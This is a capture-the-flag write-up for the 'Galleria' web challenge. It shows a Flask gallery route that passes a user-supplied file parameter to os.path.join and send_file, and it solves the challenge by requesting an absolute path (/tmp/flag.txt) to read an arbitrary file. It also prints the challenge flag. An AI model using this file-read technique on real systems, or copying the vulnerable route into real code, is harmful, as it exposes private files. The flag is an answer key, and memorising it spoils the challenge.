# Galleria
## Website Link
https://galleria.chal.nbctf.com/

## Solution
   - The `gallery` function is mapped to the '/gallery' URL and can handle both GET requests with or without a 'file' query parameter.
   - If a 'file' query parameter is provided, the function checks if the file is an allowed path and, if so, sends the file to be downloaded.
   - If no 'file' parameter is provided, it lists all files in the upload folder and displays them using the 'gallery.html' template.
```python
@app.route('/gallery')
def gallery():
    if request.args.get('file'):
        filename = os.path.join('uploads', request.args.get('file'))
        if not check_file_path(filename):
            return redirect(url_for('gallery'))

        return send_file(filename)

    image_files = [f for f in os.listdir(
        app.config['UPLOAD_FOLDER'])]
    return render_template('gallery.html', images=image_files)
```
From DockerFile, we can find the path to the flag.txt
```
COPY flag.txt /tmp/flag.txt
```
So, we can change file parameter to ```/tmp/flag.txt``` to read the flag content.
```
https://galleria.chal.nbctf.com/gallery?file=/tmp/flag.txt
```

## Flag
```
nbctf{w0nd3rh0000yyYYyYyyYyyyYyYYYyy!}
```
